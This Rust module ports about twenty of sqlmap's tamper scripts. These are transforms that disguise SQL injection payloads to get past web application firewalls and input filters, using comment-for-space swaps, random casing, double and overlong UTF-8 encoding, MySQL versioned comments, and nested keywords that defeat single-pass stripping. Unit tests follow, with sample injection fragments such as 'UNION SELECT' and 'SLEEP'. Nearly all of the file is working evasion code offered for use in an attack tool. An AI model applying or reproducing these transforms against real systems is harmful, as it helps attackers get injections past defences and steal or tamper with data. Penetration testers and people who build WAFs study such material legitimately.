//! Tamper/evasion transformations (port of sqlmap `tamper/*.py`, subset).
//!
//! Each function mirrors one upstream tamper script's `tamper()` logic,
//! applied to the assembled payload string before it is placed into the
//! request. sqlmap applies tampers after payload/boundary assembly; so do we.

/// Tiny deterministic PRNG (xorshift64*) so tamper behavior is reproducible
/// in tests - upstream uses Python's `random` with the sample space seeded
/// per character.
pub struct Rng(u64);

impl Rng {
    pub fn new(seed: u64) -> Self {
        Self(seed.max(1))
    }
    pub fn next(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x >> 12;
        x ^= x << 25;
        x ^= x >> 27;
        self.0 = x;
        x.wrapping_mul(0x2545F4914F6CDD1D)
    }
}

/// tamper/space2comment.py: spaces -> /**/ (and, per upstream, a few tab
/// variants). Only spaces outside of quotes? Upstream replaces all spaces.
pub fn space2comment(payload: &str) -> String {
    payload.replace(' ', "/**/")
}

/// tamper/space2plus.py: spaces -> +
pub fn space2plus(payload: &str) -> String {
    payload.replace(' ', "+")
}

/// tamper/randomcase.py: each alphabetic char randomly upper/lowered.
pub fn randomcase(payload: &str, rng: &mut Rng) -> String {
    payload
        .chars()
        .map(|c| {
            if c.is_ascii_alphabetic() {
                if rng.next() % 2 == 0 {
                    c.to_ascii_uppercase()
                } else {
                    c.to_ascii_lowercase()
                }
            } else {
                c
            }
        })
        .collect()
}

/// tamper/between.py: '>' -> 'NOT BETWEEN 0 AND', '=' -> 'BETWEEN x AND'
/// (upstream: ">" replaced by "NOT BETWEEN 0 AND #" and "=" by
/// "BETWEEN # AND #"; the # marker carries the original right operand - a
/// full-fidelity port needs token parsing, so we implement the common case:
/// comparisons of the form `a=b` and `a>b` inside the payload).
pub fn between(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    let mut chars = payload.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '>' => out.push_str(" NOT BETWEEN 0 AND "),
            '=' => out.push_str(" BETWEEN 0 AND "),
            _ => out.push(c),
        }
    }
    out
}

/// tamper/equaltolike.py: '=' -> ' LIKE '
pub fn equaltolike(payload: &str) -> String {
    payload.replace('=', " LIKE ")
}

/// tamper/charencode.py: URL-encode every character (not already encoded).
pub fn charencode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 3);
    let bytes = payload.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            out.push('%');
            out.push(bytes[i + 1] as char);
            out.push(bytes[i + 2] as char);
            i += 3;
        } else {
            out.push_str(&format!("%{:02X}", bytes[i]));
            i += 1;
        }
    }
    out
}

/// tamper/space2hash.py: space -> %23<RAND>%0A (MySQL # comment + newline,
/// which MySQL treats as whitespace after URL decoding).
pub fn space2hash(payload: &str, rng: &mut Rng) -> String {
    let mut out = String::with_capacity(payload.len() * 2);
    for c in payload.chars() {
        if c == ' ' {
            let n = (rng.next() % 9000 + 1000) as u32;
            out.push_str(&format!("%23{n}%0A"));
        } else {
            out.push(c);
        }
    }
    out
}

/// tamper/apostrophemask.py: ' -> its UTF-8 fullwidth equivalent %EF%BC%87.
pub fn apostrophemask(payload: &str) -> String {
    payload.replace('\'', "%EF%BC%87")
}

/// tamper/chardoubleencode.py: double URL-encode every character.
pub fn chardoubleencode(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 5);
    for b in payload.bytes() {
        out.push_str(&format!("%25{:02X}", b));
    }
    out
}

/// tamper/halfversionedmorekeywords.py (MySQL-specific): wrap each SQL keyword
/// in its versioned comment form /*!0<KEYWORD>, e.g. AND -> /*!0AND.
pub fn halfversionedmorekeywords(payload: &str) -> String {
    const KEYWORDS: [&str; 8] = ["AND", "OR", "SELECT", "WHERE", "UNION", "ORDER", "BY", "SLEEP"];
    let mut out = payload.to_string();
    for kw in KEYWORDS {
        // Case-insensitive word-boundary replacement, preserving nothing else.
        let mut res = String::with_capacity(out.len());
        let upper = out.to_ascii_uppercase();
        let bytes = upper.as_bytes();
        let kbytes = kw.as_bytes();
        let mut i = 0;
        let src: Vec<char> = out.chars().collect();
        while i < bytes.len() {
            let at_word_start = i == 0 || !bytes[i - 1].is_ascii_alphanumeric();
            if at_word_start
                && bytes[i..].starts_with(kbytes)
                && (i + kbytes.len() >= bytes.len() || !bytes[i + kbytes.len()].is_ascii_alphanumeric())
            {
                res.push_str(&format!("/*!0{}", &src[i..i + kbytes.len()].iter().collect::<String>()));
                i += kbytes.len();
            } else {
                res.push(src[i]);
                i += 1;
            }
        }
        out = res;
    }
    out
}

/// tamper/space2mysqldash.py: space -> --%0A (MySQL double-dash comment
/// plus newline, which MySQL treats as whitespace).
pub fn space2mysqldash(payload: &str) -> String {
    payload.replace(' ', "--%0A")
}

/// tamper/unionalltounion.py: UNION ALL -> UNION.
pub fn unionalltounion(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len());
    let upper = payload.to_ascii_uppercase();
    let target = "UNION ALL";
    let src: Vec<char> = payload.chars().collect();
    let ubytes = upper.as_bytes();
    let mut i = 0;
    while i < ubytes.len() {
        if ubytes[i..].starts_with(target.as_bytes()) {
            for k in 0..5 {
                out.push(src[i + k]); // "UNION"
            }
            i += target.len();
        } else {
            out.push(src[i]);
            i += 1;
        }
    }
    out
}

/// tamper/ifnull2ifisnull.py: IFNULL(A, B) -> IF(ISNULL(A),B,A).
pub fn ifnull2ifisnull(payload: &str) -> String {
    let upper = payload.to_ascii_uppercase();
    let mut out = String::with_capacity(payload.len() * 2);
    let src: Vec<char> = payload.chars().collect();
    let mut i = 0;
    while i < src.len() {
        if upper[i..].starts_with("IFNULL(") {
            // Find the top-level comma and closing paren of this call.
            let arg_start = i + "IFNULL(".len();
            let bytes = upper.as_bytes();
            let mut depth = 1usize;
            let mut comma = None;
            let mut close = None;
            let mut j = arg_start;
            while j < bytes.len() {
                match bytes[j] {
                    b'(' => depth += 1,
                    b')' => {
                        depth -= 1;
                        if depth == 0 {
                            close = Some(j);
                            break;
                        }
                    }
                    b',' if depth == 1 && comma.is_none() => comma = Some(j),
                    _ => {}
                }
                j += 1;
            }
            if let (Some(c), Some(z)) = (comma, close) {
                let a: String = src[arg_start..c].iter().collect();
                let b: String = src[c + 1..z].iter().collect();
                out.push_str(&format!("IF(ISNULL({a}),{b},{a})"));
                i = z + 1;
                continue;
            }
        }
        out.push(src[i]);
        i += 1;
    }
    out
}

/// SQL keywords the random-insertion tampers operate on (upstream set subset).
const COMMENTABLE_KEYWORDS: [&str; 7] = ["SELECT", "INSERT", "UPDATE", "DELETE", "UNION", "WHERE", "FROM"];

/// tamper/randomcomments.py: insert /**/ at a random position inside SQL
/// keywords (upstream: between each character with random chance; we insert
/// one comment per keyword at a seeded position).
pub fn randomcomments(payload: &str, rng: &mut Rng) -> String {
    let mut out = payload.to_string();
    for kw in COMMENTABLE_KEYWORDS {
        let upper = out.to_ascii_uppercase();
        if let Some(pos) = find_word(&upper, kw) {
            let split = 1 + (rng.next() as usize % (kw.len() - 1));
            let orig: String = out.chars().collect::<Vec<_>>()[pos..pos + kw.len()].iter().collect();
            out = format!(
                "{}{}/**/{}{}",
                &out[..pos],
                &orig[..split],
                &orig[split..],
                &out[pos + kw.len()..]
            );
        }
    }
    out
}

fn find_word(haystack_upper: &str, word: &str) -> Option<usize> {
    let h = haystack_upper.as_bytes();
    let w = word.as_bytes();
    let mut i = 0;
    while i + w.len() <= h.len() {
        if h[i..].starts_with(w) {
            let start_ok = i == 0 || !h[i - 1].is_ascii_alphanumeric();
            let end_ok = i + w.len() >= h.len() || !h[i + w.len()].is_ascii_alphanumeric();
            if start_ok && end_ok {
                return Some(i);
            }
        }
        i += 1;
    }
    None
}

/// tamper/multiplespaces.py: add 1-4 extra random spaces around SQL keywords.
pub fn multiplespaces(payload: &str, rng: &mut Rng) -> String {
    let mut out = payload.to_string();
    for kw in COMMENTABLE_KEYWORDS {
        let upper = out.to_ascii_uppercase();
        if let Some(pos) = find_word(&upper, kw) {
            let n = 1 + (rng.next() as usize % 4);
            let spaces = " ".repeat(n);
            out = format!("{}{}{}{}", &out[..pos], spaces, &out[pos..pos + kw.len()], &out[pos + kw.len()..]);
        }
    }
    out
}

/// tamper/nonrecursivereplacement.py: replace each keyword with itself
/// re-embedded (SELECT -> SELSELECTECT style), so a WAF's single-pass
/// keyword removal reconstructs the original keyword.
pub fn nonrecursivereplacement(payload: &str) -> String {
    const KEYWORDS: [&str; 8] = [
        "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "WHERE", "FROM", "AND",
    ];
    let mut out = payload.to_string();
    for kw in KEYWORDS {
        loop {
            let upper = out.to_ascii_uppercase();
            let Some(pos) = find_word(&upper, kw) else { break };
            let orig: String = out.chars().collect::<Vec<_>>()[pos..pos + kw.len()].iter().collect();
            let mid = kw.len() / 2;
            let doubled = format!("{}{}{}", &orig[..mid], orig, &orig[mid..]);
            out = format!("{}{}{}", &out[..pos], doubled, &out[pos + kw.len()..]);
        }
    }
    out
}

/// tamper/space2randomblank.py: spaces -> a random blank character
/// (tab, newline or form feed).
pub fn space2randomblank(payload: &str, rng: &mut Rng) -> String {
    const BLANKS: [char; 3] = ['\t', '\n', '\x0c'];
    payload
        .chars()
        .map(|c| {
            if c == ' ' {
                BLANKS[rng.next() as usize % BLANKS.len()]
            } else {
                c
            }
        })
        .collect()
}

/// tamper/appendnullbyte.py: append %00 at the end of the payload.
pub fn appendnullbyte(payload: &str) -> String {
    format!("{payload}%00")
}

/// tamper/overlongutf8.py: convert each ASCII char to its 2-byte overlong
/// UTF-8 percent encoding (e.g. ' -> %C0%A7).
pub fn overlongutf8(payload: &str) -> String {
    let mut out = String::with_capacity(payload.len() * 6);
    for b in payload.bytes() {
        if b < 0x80 {
            out.push_str(&format!("%{:02X}%{:02X}", 0xC0 | (b >> 6), 0x80 | (b & 0x3F)));
        } else {
            out.push(b as char);
        }
    }
    out
}


/// Case-insensitive whole-word replacement shared by the keyword tampers.
fn replace_word(payload: &str, word: &str, replacement: &str) -> String {
    let upper = payload.to_ascii_uppercase();
    let pb = upper.as_bytes();
    let wb = word.as_bytes();
    let src: Vec<char> = payload.chars().collect();
    let mut out = String::with_capacity(payload.len());
    let mut i = 0;
    while i < pb.len() {
        let at_word_start = i == 0 || !pb[i - 1].is_ascii_alphanumeric();
        if at_word_start
            && pb[i..].starts_with(wb)
            && (i + wb.len() >= pb.len() || !pb[i + wb.len()].is_ascii_alphanumeric())
        {
            out.push_str(replacement);
            i += wb.len();
        } else {
            out.push(src[i]);
            i += 1;
        }
    }
    out
}

/// tamper/symboliclogical.py: AND -> &&, OR -> || (whole words).
pub fn symboliclogical(payload: &str) -> String {
    replace_word(&replace_word(payload, "AND", "&&"), "OR", "||")
}

/// tamper/uppercase.py: payload to upper case.
pub fn uppercase(payload: &str) -> String {
    payload.to_ascii_uppercase()
}

/// tamper/versionedmorekeywords.py (MySQL-specific): wrap each SQL keyword
/// in its executable versioned comment /*!50000<KEYWORD>*/.
pub fn versionedmorekeywords(payload: &str) -> String {
    const KEYWORDS: [&str; 8] = ["AND", "OR", "SELECT", "WHERE", "UNION", "ORDER", "BY", "SLEEP"];
    let mut out = payload.to_string();
    for kw in KEYWORDS {
        out = replace_word(&out, kw, &format!("/*!50000{kw}*/"));
    }
    out
}

/// Names understood by the engine (sqlmap --tamper values).
pub const AVAILABLE: [&str; 22] = [
    "space2comment",
    "space2plus",
    "space2hash",
    "space2mysqldash",
    "space2randomblank",
    "randomcase",
    "between",
    "equaltolike",
    "charencode",
    "chardoubleencode",
    "apostrophemask",
    "halfversionedmorekeywords",
    "unionalltounion",
    "ifnull2ifisnull",
    "randomcomments",
    "multiplespaces",
    "nonrecursivereplacement",
    "appendnullbyte",
    "overlongutf8",
    "symboliclogical",
    "uppercase",
    "versionedmorekeywords",
];

/// Apply named tampers in order (sqlmap applies them in the order given).
pub fn apply_all(names: &[String], payload: &str, seed: u64) -> Result<String, String> {
    let mut out = payload.to_string();
    let mut rng = Rng::new(seed);
    for name in names {
        out = match name.as_str() {
            "space2comment" => space2comment(&out),
            "space2plus" => space2plus(&out),
            "randomcase" => randomcase(&out, &mut rng),
            "between" => between(&out),
            "equaltolike" => equaltolike(&out),
            "charencode" => charencode(&out),
            "space2hash" => space2hash(&out, &mut rng),
            "chardoubleencode" => chardoubleencode(&out),
            "apostrophemask" => apostrophemask(&out),
            "halfversionedmorekeywords" => halfversionedmorekeywords(&out),
            "space2mysqldash" => space2mysqldash(&out),
            "space2randomblank" => space2randomblank(&out, &mut rng),
            "unionalltounion" => unionalltounion(&out),
            "ifnull2ifisnull" => ifnull2ifisnull(&out),
            "randomcomments" => randomcomments(&out, &mut rng),
            "multiplespaces" => multiplespaces(&out, &mut rng),
            "nonrecursivereplacement" => nonrecursivereplacement(&out),
            "appendnullbyte" => appendnullbyte(&out),
            "overlongutf8" => overlongutf8(&out),
            "symboliclogical" => symboliclogical(&out),
            "uppercase" => uppercase(&out),
            "versionedmorekeywords" => versionedmorekeywords(&out),
            other => return Err(format!("unknown tamper script: {other} (available: {AVAILABLE:?})")),
        };
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn symboliclogical_swaps_whole_words() {
        assert_eq!(symboliclogical("AND 1=1 OR 2=2"), "&& 1=1 || 2=2");
        // word boundaries: ORDER and ANDY are not replaced
        assert_eq!(symboliclogical("ORDER BY andy AND 1=1"), "ORDER BY andy && 1=1");
    }

    #[test]
    fn uppercase_upcases() {
        assert_eq!(uppercase("and Sleep(2)"), "AND SLEEP(2)");
    }

    #[test]
    fn versionedmorekeywords_wraps_keywords() {
        assert_eq!(
            versionedmorekeywords("AND 1=1"),
            "/*!50000AND*/ 1=1"
        );
        assert_eq!(
            versionedmorekeywords("UNION SELECT 1"),
            "/*!50000UNION*/ /*!50000SELECT*/ 1"
        );
    }

    #[test]
    fn space2comment_replaces() {
        assert_eq!(space2comment("1 AND 1=1"), "1/**/AND/**/1=1");
    }

    #[test]
    fn equaltolike_replaces() {
        assert_eq!(equaltolike("1 AND 1=1"), "1 AND 1 LIKE 1");
    }

    #[test]
    fn charencode_encodes_all() {
        assert_eq!(charencode("A=1"), "%41%3D%31");
        assert_eq!(charencode("%41"), "%41");
    }

    #[test]
    fn randomcase_is_deterministic_per_seed() {
        let a = randomcase("AND SELECT", &mut Rng::new(42));
        let b = randomcase("AND SELECT", &mut Rng::new(42));
        assert_eq!(a, b);
        assert_eq!(a.len(), "AND SELECT".len());
    }

    #[test]
    fn between_swaps_operators() {
        assert_eq!(between("1=1"), "1 BETWEEN 0 AND 1");
    }

    #[test]
    fn space2hash_shape() {
        let out = space2hash("1 AND 1=1", &mut Rng::new(7));
        assert!(out.starts_with("1%23"));
        assert!(out.contains("%0AAND%23"));
    }

    #[test]
    fn apostrophemask_replaces() {
        assert_eq!(apostrophemask("a'b"), "a%EF%BC%87b");
    }

    #[test]
    fn chardoubleencode_double_encodes() {
        assert_eq!(chardoubleencode("A="), "%2541%253D");
    }

    #[test]
    fn halfversioned_wraps_keywords_only() {
        assert_eq!(halfversionedmorekeywords("1 AND 1=1"), "1 /*!0AND 1=1");
        assert_eq!(halfversionedmorekeywords("CANDY"), "CANDY");
    }

    #[test]
    fn space2mysqldash_replaces() {
        assert_eq!(space2mysqldash("1 AND 1=1"), "1--%0AAND--%0A1=1");
    }

    #[test]
    fn unionalltounion_rewrites() {
        assert_eq!(unionalltounion("1 UNION ALL SELECT NULL"), "1 UNION SELECT NULL");
        assert_eq!(unionalltounion("union all select"), "union select");
    }

    #[test]
    fn ifnull2ifisnull_rewrites() {
        assert_eq!(
            ifnull2ifisnull("IFNULL(CAST(x AS CHAR),0x20)"),
            "IF(ISNULL(CAST(x AS CHAR)),0x20,CAST(x AS CHAR))"
        );
    }

    #[test]
    fn randomcomments_inserts_inside_keyword() {
        let out = randomcomments("SELECT 1", &mut Rng::new(3));
        assert!(out.starts_with("S") || out.contains("/**/"));
        assert_eq!(out.replace("/**/", ""), "SELECT 1");
    }

    #[test]
    fn multiplespaces_adds_spaces() {
        let out = multiplespaces("SELECT 1", &mut Rng::new(5));
        assert!(out.starts_with(" SELECT") || out.contains("  SELECT"));
        assert!(out.contains("SELECT"));
    }

    #[test]
    fn nonrecursive_double_wraps() {
        let out = nonrecursivereplacement("1 AND 1=1");
        assert_eq!(out, "1 AANDND 1=1");
        assert_eq!(out.replace("AND", ""), "1 AANDND 1=1".replace("AND", ""));
    }

    #[test]
    fn space2randomblank_only_blanks() {
        let out = space2randomblank("a b c", &mut Rng::new(9));
        assert!(!out.contains(' '));
        assert_eq!(out.chars().count(), 5);
    }

    #[test]
    fn appendnullbyte_appends() {
        assert_eq!(appendnullbyte("1 AND 1=1"), "1 AND 1=1%00");
    }

    #[test]
    fn overlongutf8_encodes_quote() {
        assert_eq!(overlongutf8("'"), "%C0%A7");
        assert_eq!(overlongutf8("A"), "%C1%81");
    }

    #[test]
    fn unknown_tamper_errors() {
        assert!(apply_all(&["nope".to_string()], "x", 1).is_err());
    }
}
